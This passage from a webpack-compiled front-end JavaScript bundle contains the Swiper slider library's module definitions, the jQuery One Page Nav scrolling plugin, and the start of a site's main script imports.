                  0 === S.length && (S = s('<div class="swiper-slide-shadow-' + (l ? "left" : "top") + '"></div>'), f.append(S)), 0 === C.length && (C = s('<div class="swiper-slide-shadow-' + (l ? "right" : "bottom") + '"></div>'), f.append(C)), S.length && (S[0].style.opacity = g > 0 ? g : 0), C.length && (C[0].style.opacity = -g > 0 ? -g : 0);
                }
              }
              (o.pointerEvents || o.prefixedPointerEvents) && (a[0].style.perspectiveOrigin = h + "px 50%");
            },
            setTransition: function setTransition(e) {
              this.slides.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e);
            }
          },
          be = {
            init: function init() {
              var e = this.params.thumbs,
                t = this.constructor;
              e.swiper instanceof t ? (this.thumbs.swiper = e.swiper, n.extend(this.thumbs.swiper.originalParams, {
                watchSlidesProgress: !0,
                slideToClickedSlide: !1
              }), n.extend(this.thumbs.swiper.params, {
                watchSlidesProgress: !0,
                slideToClickedSlide: !1
              })) : n.isObject(e.swiper) && (this.thumbs.swiper = new t(n.extend({}, e.swiper, {
                watchSlidesVisibility: !0,
                watchSlidesProgress: !0,
                slideToClickedSlide: !1
              })), this.thumbs.swiperCreated = !0), this.thumbs.swiper.$el.addClass(this.params.thumbs.thumbsContainerClass), this.thumbs.swiper.on("tap", this.thumbs.onThumbClick);
            },
            onThumbClick: function onThumbClick() {
              var e = this.thumbs.swiper;
              if (e) {
                var t = e.clickedIndex,
                  i = e.clickedSlide;
                if (!(i && s(i).hasClass(this.params.thumbs.slideThumbActiveClass) || null == t)) {
                  var a;
                  if (a = e.params.loop ? parseInt(s(e.clickedSlide).attr("data-swiper-slide-index"), 10) : t, this.params.loop) {
                    var r = this.activeIndex;
                    this.slides.eq(r).hasClass(this.params.slideDuplicateClass) && (this.loopFix(), this._clientLeft = this.$wrapperEl[0].clientLeft, r = this.activeIndex);
                    var n = this.slides.eq(r).prevAll('[data-swiper-slide-index="' + a + '"]').eq(0).index(),
                      o = this.slides.eq(r).nextAll('[data-swiper-slide-index="' + a + '"]').eq(0).index();
                    a = void 0 === n ? o : void 0 === o ? n : o - r < r - n ? o : n;
                  }
                  this.slideTo(a);
                }
              }
            },
            update: function update(e) {
              var t = this.thumbs.swiper;
              if (t) {
                var i = "auto" === t.params.slidesPerView ? t.slidesPerViewDynamic() : t.params.slidesPerView;
                if (this.realIndex !== t.realIndex) {
                  var s,
                    a = t.activeIndex;
                  if (t.params.loop) {
                    t.slides.eq(a).hasClass(t.params.slideDuplicateClass) && (t.loopFix(), t._clientLeft = t.$wrapperEl[0].clientLeft, a = t.activeIndex);
                    var r = t.slides.eq(a).prevAll('[data-swiper-slide-index="' + this.realIndex + '"]').eq(0).index(),
                      n = t.slides.eq(a).nextAll('[data-swiper-slide-index="' + this.realIndex + '"]').eq(0).index();
                    s = void 0 === r ? n : void 0 === n ? r : n - a == a - r ? a : n - a < a - r ? n : r;
                  } else s = this.realIndex;
                  t.visibleSlidesIndexes && t.visibleSlidesIndexes.indexOf(s) < 0 && (t.params.centeredSlides ? s = s > a ? s - Math.floor(i / 2) + 1 : s + Math.floor(i / 2) - 1 : s > a && (s = s - i + 1), t.slideTo(s, e ? 0 : void 0));
                }
                var o = 1,
                  l = this.params.thumbs.slideThumbActiveClass;
                if (this.params.slidesPerView > 1 && !this.params.centeredSlides && (o = this.params.slidesPerView), this.params.thumbs.multipleActiveThumbs || (o = 1), o = Math.floor(o), t.slides.removeClass(l), t.params.loop || t.params.virtual && t.params.virtual.enabled) for (var d = 0; d < o; d += 1) t.$wrapperEl.children('[data-swiper-slide-index="' + (this.realIndex + d) + '"]').addClass(l);else for (var h = 0; h < o; h += 1) t.slides.eq(this.realIndex + h).addClass(l);
              }
            }
          },
          we = [R, q, K, U, Z, J, te, {
            name: "mousewheel",
            params: {
              mousewheel: {
                enabled: !1,
                releaseOnEdges: !1,
                invert: !1,
                forceToAxis: !1,
                sensitivity: 1,
                eventsTarged: "container"
              }
            },
            create: function create() {
              n.extend(this, {
                mousewheel: {
                  enabled: !1,
                  enable: ie.enable.bind(this),
                  disable: ie.disable.bind(this),
                  handle: ie.handle.bind(this),
                  handleMouseEnter: ie.handleMouseEnter.bind(this),
                  handleMouseLeave: ie.handleMouseLeave.bind(this),
                  animateSlider: ie.animateSlider.bind(this),
                  releaseScroll: ie.releaseScroll.bind(this),
                  lastScrollTime: n.now(),
                  lastEventBeforeSnap: void 0,
                  recentWheelEvents: []
                }
              });
            },
            on: {
              init: function init() {
                !this.params.mousewheel.enabled && this.params.cssMode && this.mousewheel.disable(), this.params.mousewheel.enabled && this.mousewheel.enable();
              },
              destroy: function destroy() {
                this.params.cssMode && this.mousewheel.enable(), this.mousewheel.enabled && this.mousewheel.disable();
              }
            }
          }, {
            name: "navigation",
            params: {
              navigation: {
                nextEl: null,
                prevEl: null,
                hideOnClick: !1,
                disabledClass: "swiper-button-disabled",
                hiddenClass: "swiper-button-hidden",
                lockClass: "swiper-button-lock"
              }
            },
            create: function create() {
              n.extend(this, {
                navigation: {
                  init: se.init.bind(this),
                  update: se.update.bind(this),
                  destroy: se.destroy.bind(this),
                  onNextClick: se.onNextClick.bind(this),
                  onPrevClick: se.onPrevClick.bind(this)
                }
              });
            },
            on: {
              init: function init() {
                this.navigation.init(), this.navigation.update();
              },
              toEdge: function toEdge() {
                this.navigation.update();
              },
              fromEdge: function fromEdge() {
                this.navigation.update();
              },
              destroy: function destroy() {
                this.navigation.destroy();
              },
              click: function click(e) {
                var t,
                  i = this.navigation,
                  a = i.$nextEl,
                  r = i.$prevEl;
                !this.params.navigation.hideOnClick || s(e.target).is(r) || s(e.target).is(a) || (a ? t = a.hasClass(this.params.navigation.hiddenClass) : r && (t = r.hasClass(this.params.navigation.hiddenClass)), !0 === t ? this.emit("navigationShow", this) : this.emit("navigationHide", this), a && a.toggleClass(this.params.navigation.hiddenClass), r && r.toggleClass(this.params.navigation.hiddenClass));
              }
            }
          }, {
            name: "pagination",
            params: {
              pagination: {
                el: null,
                bulletElement: "span",
                clickable: !1,
                hideOnClick: !1,
                renderBullet: null,
                renderProgressbar: null,
                renderFraction: null,
                renderCustom: null,
                progressbarOpposite: !1,
                type: "bullets",
                dynamicBullets: !1,
                dynamicMainBullets: 1,
                formatFractionCurrent: function formatFractionCurrent(e) {
                  return e;
                },
                formatFractionTotal: function formatFractionTotal(e) {
                  return e;
                },
                bulletClass: "swiper-pagination-bullet",
                bulletActiveClass: "swiper-pagination-bullet-active",
                modifierClass: "swiper-pagination-",
                currentClass: "swiper-pagination-current",
                totalClass: "swiper-pagination-total",
                hiddenClass: "swiper-pagination-hidden",
                progressbarFillClass: "swiper-pagination-progressbar-fill",
                progressbarOppositeClass: "swiper-pagination-progressbar-opposite",
                clickableClass: "swiper-pagination-clickable",
                lockClass: "swiper-pagination-lock"
              }
            },
            create: function create() {
              n.extend(this, {
                pagination: {
                  init: ae.init.bind(this),
                  render: ae.render.bind(this),
                  update: ae.update.bind(this),
                  destroy: ae.destroy.bind(this),
                  dynamicBulletIndex: 0
                }
              });
            },
            on: {
              init: function init() {
                this.pagination.init(), this.pagination.render(), this.pagination.update();
              },
              activeIndexChange: function activeIndexChange() {
                this.params.loop ? this.pagination.update() : void 0 === this.snapIndex && this.pagination.update();
              },
              snapIndexChange: function snapIndexChange() {
                this.params.loop || this.pagination.update();
              },
              slidesLengthChange: function slidesLengthChange() {
                this.params.loop && (this.pagination.render(), this.pagination.update());
              },
              snapGridLengthChange: function snapGridLengthChange() {
                this.params.loop || (this.pagination.render(), this.pagination.update());
              },
              destroy: function destroy() {
                this.pagination.destroy();
              },
              click: function click(e) {
                this.params.pagination.el && this.params.pagination.hideOnClick && this.pagination.$el.length > 0 && !s(e.target).hasClass(this.params.pagination.bulletClass) && (!0 === this.pagination.$el.hasClass(this.params.pagination.hiddenClass) ? this.emit("paginationShow", this) : this.emit("paginationHide", this), this.pagination.$el.toggleClass(this.params.pagination.hiddenClass));
              }
            }
          }, {
            name: "scrollbar",
            params: {
              scrollbar: {
                el: null,
                dragSize: "auto",
                hide: !1,
                draggable: !1,
                snapOnRelease: !0,
                lockClass: "swiper-scrollbar-lock",
                dragClass: "swiper-scrollbar-drag"
              }
            },
            create: function create() {
              n.extend(this, {
                scrollbar: {
                  init: re.init.bind(this),
                  destroy: re.destroy.bind(this),
                  updateSize: re.updateSize.bind(this),
                  setTranslate: re.setTranslate.bind(this),
                  setTransition: re.setTransition.bind(this),
                  enableDraggable: re.enableDraggable.bind(this),
                  disableDraggable: re.disableDraggable.bind(this),
                  setDragPosition: re.setDragPosition.bind(this),
                  getPointerPosition: re.getPointerPosition.bind(this),
                  onDragStart: re.onDragStart.bind(this),
                  onDragMove: re.onDragMove.bind(this),
                  onDragEnd: re.onDragEnd.bind(this),
                  isTouched: !1,
                  timeout: null,
                  dragTimeout: null
                }
              });
            },
            on: {
              init: function init() {
                this.scrollbar.init(), this.scrollbar.updateSize(), this.scrollbar.setTranslate();
              },
              update: function update() {
                this.scrollbar.updateSize();
              },
              resize: function resize() {
                this.scrollbar.updateSize();
              },
              observerUpdate: function observerUpdate() {
                this.scrollbar.updateSize();
              },
              setTranslate: function setTranslate() {
                this.scrollbar.setTranslate();
              },
              setTransition: function setTransition(e) {
                this.scrollbar.setTransition(e);
              },
              destroy: function destroy() {
                this.scrollbar.destroy();
              }
            }
          }, {
            name: "parallax",
            params: {
              parallax: {
                enabled: !1
              }
            },
            create: function create() {
              n.extend(this, {
                parallax: {
                  setTransform: ne.setTransform.bind(this),
                  setTranslate: ne.setTranslate.bind(this),
                  setTransition: ne.setTransition.bind(this)
                }
              });
            },
            on: {
              beforeInit: function beforeInit() {
                this.params.parallax.enabled && (this.params.watchSlidesProgress = !0, this.originalParams.watchSlidesProgress = !0);
              },
              init: function init() {
                this.params.parallax.enabled && this.parallax.setTranslate();
              },
              setTranslate: function setTranslate() {
                this.params.parallax.enabled && this.parallax.setTranslate();
              },
              setTransition: function setTransition(e) {
                this.params.parallax.enabled && this.parallax.setTransition(e);
              }
            }
          }, {
            name: "zoom",
            params: {
              zoom: {
                enabled: !1,
                maxRatio: 3,
                minRatio: 1,
                toggle: !0,
                containerClass: "swiper-zoom-container",
                zoomedSlideClass: "swiper-slide-zoomed"
              }
            },
            create: function create() {
              var e = this,
                t = {
                  enabled: !1,
                  scale: 1,
                  currentScale: 1,
                  isScaling: !1,
                  gesture: {
                    $slideEl: void 0,
                    slideWidth: void 0,
                    slideHeight: void 0,
                    $imageEl: void 0,
                    $imageWrapEl: void 0,
                    maxRatio: 3
                  },
                  image: {
                    isTouched: void 0,
                    isMoved: void 0,
                    currentX: void 0,
                    currentY: void 0,
                    minX: void 0,
                    minY: void 0,
                    maxX: void 0,
                    maxY: void 0,
                    width: void 0,
                    height: void 0,
                    startX: void 0,
                    startY: void 0,
                    touchesStart: {},
                    touchesCurrent: {}
                  },
                  velocity: {
                    x: void 0,
                    y: void 0,
                    prevPositionX: void 0,
                    prevPositionY: void 0,
                    prevTime: void 0
                  }
                };
              "onGestureStart onGestureChange onGestureEnd onTouchStart onTouchMove onTouchEnd onTransitionEnd toggle enable disable in out".split(" ").forEach(function (i) {
                t[i] = oe[i].bind(e);
              }), n.extend(e, {
                zoom: t
              });
              var i = 1;
              Object.defineProperty(e.zoom, "scale", {
                get: function get() {
                  return i;
                },
                set: function set(t) {
                  if (i !== t) {
                    var s = e.zoom.gesture.$imageEl ? e.zoom.gesture.$imageEl[0] : void 0,
                      a = e.zoom.gesture.$slideEl ? e.zoom.gesture.$slideEl[0] : void 0;
                    e.emit("zoomChange", t, s, a);
                  }
                  i = t;
                }
              });
            },
            on: {
              init: function init() {
                this.params.zoom.enabled && this.zoom.enable();
              },
              destroy: function destroy() {
                this.zoom.disable();
              },
              touchStart: function touchStart(e) {
                this.zoom.enabled && this.zoom.onTouchStart(e);
              },
              touchEnd: function touchEnd(e) {
                this.zoom.enabled && this.zoom.onTouchEnd(e);
              },
              doubleTap: function doubleTap(e) {
                this.params.zoom.enabled && this.zoom.enabled && this.params.zoom.toggle && this.zoom.toggle(e);
              },
              transitionEnd: function transitionEnd() {
                this.zoom.enabled && this.params.zoom.enabled && this.zoom.onTransitionEnd();
              },
              slideChange: function slideChange() {
                this.zoom.enabled && this.params.zoom.enabled && this.params.cssMode && this.zoom.onTransitionEnd();
              }
            }
          }, {
            name: "lazy",
            params: {
              lazy: {
                enabled: !1,
                loadPrevNext: !1,
                loadPrevNextAmount: 1,
                loadOnTransitionStart: !1,
                elementClass: "swiper-lazy",
                loadingClass: "swiper-lazy-loading",
                loadedClass: "swiper-lazy-loaded",
                preloaderClass: "swiper-lazy-preloader"
              }
            },
            create: function create() {
              n.extend(this, {
                lazy: {
                  initialImageLoaded: !1,
                  load: le.load.bind(this),
                  loadInSlide: le.loadInSlide.bind(this)
                }
              });
            },
            on: {
              beforeInit: function beforeInit() {
                this.params.lazy.enabled && this.params.preloadImages && (this.params.preloadImages = !1);
              },
              init: function init() {
                this.params.lazy.enabled && !this.params.loop && 0 === this.params.initialSlide && this.lazy.load();
              },
              scroll: function scroll() {
                this.params.freeMode && !this.params.freeModeSticky && this.lazy.load();
              },
              resize: function resize() {
                this.params.lazy.enabled && this.lazy.load();
              },
              scrollbarDragMove: function scrollbarDragMove() {
                this.params.lazy.enabled && this.lazy.load();
              },
              transitionStart: function transitionStart() {
                this.params.lazy.enabled && (this.params.lazy.loadOnTransitionStart || !this.params.lazy.loadOnTransitionStart && !this.lazy.initialImageLoaded) && this.lazy.load();
              },
              transitionEnd: function transitionEnd() {
                this.params.lazy.enabled && !this.params.lazy.loadOnTransitionStart && this.lazy.load();
              },
              slideChange: function slideChange() {
                this.params.lazy.enabled && this.params.cssMode && this.lazy.load();
              }
            }
          }, {
            name: "controller",
            params: {
              controller: {
                control: void 0,
                inverse: !1,
                by: "slide"
              }
            },
            create: function create() {
              n.extend(this, {
                controller: {
                  control: this.params.controller.control,
                  getInterpolateFunction: de.getInterpolateFunction.bind(this),
                  setTranslate: de.setTranslate.bind(this),
                  setTransition: de.setTransition.bind(this)
                }
              });
            },
            on: {
              update: function update() {
                this.controller.control && this.controller.spline && (this.controller.spline = void 0, delete this.controller.spline);
              },
              resize: function resize() {
                this.controller.control && this.controller.spline && (this.controller.spline = void 0, delete this.controller.spline);
              },
              observerUpdate: function observerUpdate() {
                this.controller.control && this.controller.spline && (this.controller.spline = void 0, delete this.controller.spline);
              },
              setTranslate: function setTranslate(e, t) {
                this.controller.control && this.controller.setTranslate(e, t);
              },
              setTransition: function setTransition(e, t) {
                this.controller.control && this.controller.setTransition(e, t);
              }
            }
          }, {
            name: "a11y",
            params: {
              a11y: {
                enabled: !0,
                notificationClass: "swiper-notification",
                prevSlideMessage: "Previous slide",
                nextSlideMessage: "Next slide",
                firstSlideMessage: "This is the first slide",
                lastSlideMessage: "This is the last slide",
                paginationBulletMessage: "Go to slide {{index}}"
              }
            },
            create: function create() {
              var e = this;
              n.extend(e, {
                a11y: {
                  liveRegion: s('<span class="' + e.params.a11y.notificationClass + '" aria-live="assertive" aria-atomic="true"></span>')
                }
              }), Object.keys(he).forEach(function (t) {
                e.a11y[t] = he[t].bind(e);
              });
            },
            on: {
              init: function init() {
                this.params.a11y.enabled && (this.a11y.init(), this.a11y.updateNavigation());
              },
              toEdge: function toEdge() {
                this.params.a11y.enabled && this.a11y.updateNavigation();
              },
              fromEdge: function fromEdge() {
                this.params.a11y.enabled && this.a11y.updateNavigation();
              },
              paginationUpdate: function paginationUpdate() {
                this.params.a11y.enabled && this.a11y.updatePagination();
              },
              destroy: function destroy() {
                this.params.a11y.enabled && this.a11y.destroy();
              }
            }
          }, {
            name: "history",
            params: {
              history: {
                enabled: !1,
                replaceState: !1,
                key: "slides"
              }
            },
            create: function create() {
              n.extend(this, {
                history: {
                  init: pe.init.bind(this),
                  setHistory: pe.setHistory.bind(this),
                  setHistoryPopState: pe.setHistoryPopState.bind(this),
                  scrollToSlide: pe.scrollToSlide.bind(this),
                  destroy: pe.destroy.bind(this)
                }
              });
            },
            on: {
              init: function init() {
                this.params.history.enabled && this.history.init();
              },
              destroy: function destroy() {
                this.params.history.enabled && this.history.destroy();
              },
              transitionEnd: function transitionEnd() {
                this.history.initialized && this.history.setHistory(this.params.history.key, this.activeIndex);
              },
              slideChange: function slideChange() {
                this.history.initialized && this.params.cssMode && this.history.setHistory(this.params.history.key, this.activeIndex);
              }
            }
          }, {
            name: "hash-navigation",
            params: {
              hashNavigation: {
                enabled: !1,
                replaceState: !1,
                watchState: !1
              }
            },
            create: function create() {
              n.extend(this, {
                hashNavigation: {
                  initialized: !1,
                  init: ce.init.bind(this),
                  destroy: ce.destroy.bind(this),
                  setHash: ce.setHash.bind(this),
                  onHashCange: ce.onHashCange.bind(this)
                }
              });
            },
            on: {
              init: function init() {
                this.params.hashNavigation.enabled && this.hashNavigation.init();
              },
              destroy: function destroy() {
                this.params.hashNavigation.enabled && this.hashNavigation.destroy();
              },
              transitionEnd: function transitionEnd() {
                this.hashNavigation.initialized && this.hashNavigation.setHash();
              },
              slideChange: function slideChange() {
                this.hashNavigation.initialized && this.params.cssMode && this.hashNavigation.setHash();
              }
            }
          }, {
            name: "autoplay",
            params: {
              autoplay: {
                enabled: !1,
                delay: 3e3,
                waitForTransition: !0,
                disableOnInteraction: !0,
                stopOnLastSlide: !1,
                reverseDirection: !1
              }
            },
            create: function create() {
              var e = this;
              n.extend(e, {
                autoplay: {
                  running: !1,
                  paused: !1,
                  run: ue.run.bind(e),
                  start: ue.start.bind(e),
                  stop: ue.stop.bind(e),
                  pause: ue.pause.bind(e),
                  onVisibilityChange: function onVisibilityChange() {
                    "hidden" === document.visibilityState && e.autoplay.running && e.autoplay.pause(), "visible" === document.visibilityState && e.autoplay.paused && (e.autoplay.run(), e.autoplay.paused = !1);
                  },
                  onTransitionEnd: function onTransitionEnd(t) {
                    e && !e.destroyed && e.$wrapperEl && t.target === this && (e.$wrapperEl[0].removeEventListener("transitionend", e.autoplay.onTransitionEnd), e.$wrapperEl[0].removeEventListener("webkitTransitionEnd", e.autoplay.onTransitionEnd), e.autoplay.paused = !1, e.autoplay.running ? e.autoplay.run() : e.autoplay.stop());
                  }
                }
              });
            },
            on: {
              init: function init() {
                this.params.autoplay.enabled && (this.autoplay.start(), document.addEventListener("visibilitychange", this.autoplay.onVisibilityChange));
              },
              beforeTransitionStart: function beforeTransitionStart(e, t) {
                this.autoplay.running && (t || !this.params.autoplay.disableOnInteraction ? this.autoplay.pause(e) : this.autoplay.stop());
              },
              sliderFirstMove: function sliderFirstMove() {
                this.autoplay.running && (this.params.autoplay.disableOnInteraction ? this.autoplay.stop() : this.autoplay.pause());
              },
              touchEnd: function touchEnd() {
                this.params.cssMode && this.autoplay.paused && !this.params.autoplay.disableOnInteraction && this.autoplay.run();
              },
              destroy: function destroy() {
                this.autoplay.running && this.autoplay.stop(), document.removeEventListener("visibilitychange", this.autoplay.onVisibilityChange);
              }
            }
          }, {
            name: "effect-fade",
            params: {
              fadeEffect: {
                crossFade: !1
              }
            },
            create: function create() {
              n.extend(this, {
                fadeEffect: {
                  setTranslate: ve.setTranslate.bind(this),
                  setTransition: ve.setTransition.bind(this)
                }
              });
            },
            on: {
              beforeInit: function beforeInit() {
                if ("fade" === this.params.effect) {
                  this.classNames.push(this.params.containerModifierClass + "fade");
                  var e = {
                    slidesPerView: 1,
                    slidesPerColumn: 1,
                    slidesPerGroup: 1,
                    watchSlidesProgress: !0,
                    spaceBetween: 0,
                    virtualTranslate: !0
                  };
                  n.extend(this.params, e), n.extend(this.originalParams, e);
                }
              },
              setTranslate: function setTranslate() {
                "fade" === this.params.effect && this.fadeEffect.setTranslate();
              },
              setTransition: function setTransition(e) {
                "fade" === this.params.effect && this.fadeEffect.setTransition(e);
              }
            }
          }, {
            name: "effect-cube",
            params: {
              cubeEffect: {
                slideShadows: !0,
                shadow: !0,
                shadowOffset: 20,
                shadowScale: .94
              }
            },
            create: function create() {
              n.extend(this, {
                cubeEffect: {
                  setTranslate: fe.setTranslate.bind(this),
                  setTransition: fe.setTransition.bind(this)
                }
              });
            },
            on: {
              beforeInit: function beforeInit() {
                if ("cube" === this.params.effect) {
                  this.classNames.push(this.params.containerModifierClass + "cube"), this.classNames.push(this.params.containerModifierClass + "3d");
                  var e = {
                    slidesPerView: 1,
                    slidesPerColumn: 1,
                    slidesPerGroup: 1,
                    watchSlidesProgress: !0,
                    resistanceRatio: 0,
                    spaceBetween: 0,
                    centeredSlides: !1,
                    virtualTranslate: !0
                  };
                  n.extend(this.params, e), n.extend(this.originalParams, e);
                }
              },
              setTranslate: function setTranslate() {
                "cube" === this.params.effect && this.cubeEffect.setTranslate();
              },
              setTransition: function setTransition(e) {
                "cube" === this.params.effect && this.cubeEffect.setTransition(e);
              }
            }
          }, {
            name: "effect-flip",
            params: {
              flipEffect: {
                slideShadows: !0,
                limitRotation: !0
              }
            },
            create: function create() {
              n.extend(this, {
                flipEffect: {
                  setTranslate: me.setTranslate.bind(this),
                  setTransition: me.setTransition.bind(this)
                }
              });
            },
            on: {
              beforeInit: function beforeInit() {
                if ("flip" === this.params.effect) {
                  this.classNames.push(this.params.containerModifierClass + "flip"), this.classNames.push(this.params.containerModifierClass + "3d");
                  var e = {
                    slidesPerView: 1,
                    slidesPerColumn: 1,
                    slidesPerGroup: 1,
                    watchSlidesProgress: !0,
                    spaceBetween: 0,
                    virtualTranslate: !0
                  };
                  n.extend(this.params, e), n.extend(this.originalParams, e);
                }
              },
              setTranslate: function setTranslate() {
                "flip" === this.params.effect && this.flipEffect.setTranslate();
              },
              setTransition: function setTransition(e) {
                "flip" === this.params.effect && this.flipEffect.setTransition(e);
              }
            }
          }, {
            name: "effect-coverflow",
            params: {
              coverflowEffect: {
                rotate: 50,
                stretch: 0,
                depth: 100,
                modifier: 1,
                slideShadows: !0
              }
            },
            create: function create() {
              n.extend(this, {
                coverflowEffect: {
                  setTranslate: ge.setTranslate.bind(this),
                  setTransition: ge.setTransition.bind(this)
                }
              });
            },
            on: {
              beforeInit: function beforeInit() {
                "coverflow" === this.params.effect && (this.classNames.push(this.params.containerModifierClass + "coverflow"), this.classNames.push(this.params.containerModifierClass + "3d"), this.params.watchSlidesProgress = !0, this.originalParams.watchSlidesProgress = !0);
              },
              setTranslate: function setTranslate() {
                "coverflow" === this.params.effect && this.coverflowEffect.setTranslate();
              },
              setTransition: function setTransition(e) {
                "coverflow" === this.params.effect && this.coverflowEffect.setTransition(e);
              }
            }
          }, {
            name: "thumbs",
            params: {
              thumbs: {
                multipleActiveThumbs: !0,
                swiper: null,
                slideThumbActiveClass: "swiper-slide-thumb-active",
                thumbsContainerClass: "swiper-container-thumbs"
              }
            },
            create: function create() {
              n.extend(this, {
                thumbs: {
                  swiper: null,
                  init: be.init.bind(this),
                  update: be.update.bind(this),
                  onThumbClick: be.onThumbClick.bind(this)
                }
              });
            },
            on: {
              beforeInit: function beforeInit() {
                var e = this.params.thumbs;
                e && e.swiper && (this.thumbs.init(), this.thumbs.update(!0));
              },
              slideChange: function slideChange() {
                this.thumbs.swiper && this.thumbs.update();
              },
              update: function update() {
                this.thumbs.swiper && this.thumbs.update();
              },
              resize: function resize() {
                this.thumbs.swiper && this.thumbs.update();
              },
              observerUpdate: function observerUpdate() {
                this.thumbs.swiper && this.thumbs.update();
              },
              setTransition: function setTransition(e) {
                var t = this.thumbs.swiper;
                t && t.setTransition(e);
              },
              beforeDestroy: function beforeDestroy() {
                var e = this.thumbs.swiper;
                e && this.thumbs.swiperCreated && e && e.destroy();
              }
            }
          }];
        return void 0 === W.use && (W.use = W.Class.use, W.installModule = W.Class.installModule), W.use(we), W;
      });
      /* WEBPACK VAR INJECTION */
    }).call(this, __webpack_require__(/*! ./../../../node_modules/webpack/buildin/harmony-module.js */"./node_modules/webpack/buildin/harmony-module.js")(module));

    /***/
  }),
  /***/"./src/js/_vendor/jQuery-One-Page-Nav.js": (
  /*!***********************************************!*\
    !*** ./src/js/_vendor/jQuery-One-Page-Nav.js ***!
    \***********************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    /*
     * jQuery One Page Nav Plugin
     * http://github.com/davist11/jQuery-One-Page-Nav
     *
     * Copyright (c) 2010 Trevor Davis (http://trevordavis.net)
     * Dual licensed under the MIT and GPL licenses.
     * Uses the same license as jQuery, see:
     * http://jquery.org/license
     *
     * @version 3.0.0
     *
     * Example usage:
     * $('#nav').onePageNav({
     *   currentClass: 'current',
     *   changeHash: false,
     *   scrollSpeed: 750
     * });
     */

    ;
    (function ($, window, document, undefined) {
      // our plugin constructor
      var OnePageNav = function OnePageNav(elem, options) {
        this.elem = elem;
        this.$elem = $(elem);
        this.options = options;
        this.metadata = this.$elem.data('plugin-options');
        this.$win = $(window);
        this.sections = {};
        this.didScroll = false;
        this.$doc = $(document);
        this.docHeight = this.$doc.height();
      };

      // the plugin prototype
      OnePageNav.prototype = {
        defaults: {
          navItems: 'a',
          currentClass: 'current',
          changeHash: false,
          easing: 'swing',
          filter: '',
          scrollSpeed: 750,
          scrollThreshold: 0.5,
          begin: false,
          end: false,
          scrollChange: false,
          offsetScroll: 0
        },
        init: function init() {
          // Introduce defaults that can be extended either
          // globally or using an object literal.
          this.config = $.extend({}, this.defaults, this.options, this.metadata);
          this.$nav = this.$elem.find(this.config.navItems);

          //Filter any links out of the nav
          if (this.config.filter !== '') {
            this.$nav = this.$nav.filter(this.config.filter);
          }

          //Handle clicks on the nav
          this.$nav.on('click.onePageNav', $.proxy(this.handleClick, this));

          //Get the section positions
          this.getPositions();

          //Handle scroll changes
          this.bindInterval();

          //Update the positions on resize too
          this.$win.on('resize.onePageNav', $.proxy(this.getPositions, this));
          return this;
        },
        adjustNav: function adjustNav(self, $parent) {
          self.$elem.find('.' + self.config.currentClass).removeClass(self.config.currentClass);
          $parent.addClass(self.config.currentClass);
        },
        bindInterval: function bindInterval() {
          var self = this;
          var docHeight;
          self.$win.on('scroll.onePageNav', function () {
            self.didScroll = true;
          });
          self.t = setInterval(function () {
            docHeight = self.$doc.height();

            //If it was scrolled
            if (self.didScroll) {
              self.didScroll = false;
              self.scrollChange();
            }

            //If the document height changes
            if (docHeight !== self.docHeight) {
              self.docHeight = docHeight;
              self.getPositions();
            }
          }, 250);
        },
        getHash: function getHash($link) {
          return $link.attr('href').split('#')[1];
        },
        getPositions: function getPositions() {
          var self = this;
          var linkHref;
          var topPos;
          var $target;
          self.$nav.each(function () {
            linkHref = self.getHash($(this));
            $target = $('#' + linkHref);
            if ($target.length) {
              topPos = $target.offset().top;
              self.sections[linkHref] = Math.round(topPos);
            }
          });
        },
        getSection: function getSection(windowPos) {
          var returnValue = null;
          var windowHeight = Math.round(this.$win.height() * this.config.scrollThreshold);
          for (var section in this.sections) {
            if (this.sections[section] - windowHeight < windowPos) {
              returnValue = section;
            }
          }
          return returnValue;
        },
        handleClick: function handleClick(e) {
          var self = this;
          var $link = $(e.currentTarget);
          var $parent = $link.parent();
          var newLoc = '#' + self.getHash($link);
          if (!$parent.hasClass(self.config.currentClass)) {
            //Start callback
            if (self.config.begin) {
              self.config.begin();
            }

            //Change the highlighted nav item
            self.adjustNav(self, $parent);

            //Removing the auto-adjust on scroll
            self.unbindInterval();

            //Scroll to the correct position
            self.scrollTo(newLoc, function () {
              //Do we need to change the hash?
              if (self.config.changeHash) {
                window.location.hash = newLoc;
              }

              //Add the auto-adjust on scroll back in
              self.bindInterval();

              //End callback
              if (self.config.end) {
                self.config.end();
              }
            });
          }
          e.preventDefault();
        },
        scrollChange: function scrollChange() {
          var windowTop = this.$win.scrollTop();
          var position = this.getSection(windowTop);
          var $parent;

          //If the position is set
          if (position !== null) {
            $parent = this.$elem.find('a[href$="#' + position + '"]').parent();

            //If it's not already the current section
            if (!$parent.hasClass(this.config.currentClass)) {
              //Change the highlighted nav item
              this.adjustNav(this, $parent);

              //If there is a scrollChange callback
              if (this.config.scrollChange) {
                this.config.scrollChange($parent);
              }
            }
          }
        },
        scrollTo: function scrollTo(target, callback) {
          var offset = $(target).offset().top;
          offset = offset - this.config.offsetScroll;
          $('html, body').animate({
            scrollTop: offset
          }, this.config.scrollSpeed, this.config.easing, callback);
        },
        unbindInterval: function unbindInterval() {
          clearInterval(this.t);
          this.$win.unbind('scroll.onePageNav');
        }
      };
      OnePageNav.defaults = OnePageNav.prototype.defaults;
      $.fn.onePageNav = function (options) {
        return this.each(function () {
          new OnePageNav(this, options).init();
        });
      };
    })(jQuery, window, document);

    /***/
  }),
  /***/"./src/js/main.js": (
  /*!************************!*\
    !*** ./src/js/main.js ***!
    \************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony import */
    var _vendor__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./vendor */"./src/js/vendor.js");
    /* harmony import */
    var _parts_preloader__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./_parts/_preloader */"./src/js/_parts/_preloader.js");
    /* harmony import */
    var _parts_preloader__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(_parts_preloader__WEBPACK_IMPORTED_MODULE_1__);
    /* harmony import */
    var _parts_portfolio_nav__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./_parts/_portfolio-nav */"./src/js/_parts/_portfolio-nav.js");
    /* harmony import */
    var _parts_portfolio_nav__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(_parts_portfolio_nav__WEBPACK_IMPORTED_MODULE_2__);
    /* harmony import */
